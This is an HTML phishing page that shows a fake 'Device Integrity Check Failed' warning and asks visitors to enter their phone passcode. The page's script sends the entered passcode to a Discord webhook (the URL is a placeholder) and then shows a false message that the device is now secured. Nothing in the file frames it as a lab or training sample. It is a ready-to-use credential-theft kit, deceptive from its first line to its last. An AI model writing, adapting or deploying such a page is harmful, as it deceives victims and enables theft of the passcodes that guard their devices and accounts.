
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Device Warning</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
    input {
      padding: 10px;
      font-size: 18px;
      margin-top: 10px;
      width: 200px;
      text-align: center;
    }
    button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <h2>‚ö†Ô∏è Device Integrity Check Failed</h2>
  <p>Your phone has detected suspicious behavior. To continue:</p>
  <form id="phishForm">
    <input type="password" id="input" placeholder="Enter Passcode" required />
    <br>
    <button type="submit">Continue</button>
  </form>

  <script>
    document.getElementById("phishForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const pass = document.getElementById("input").value;

      const webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";

      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `üì≤ **Passcode Entered:** ${pass}`
        })
      });

      alert("Thank you. Your device is now secured.");
      document.getElementById("phishForm").reset();
    });
  </script>
</body>
</html>
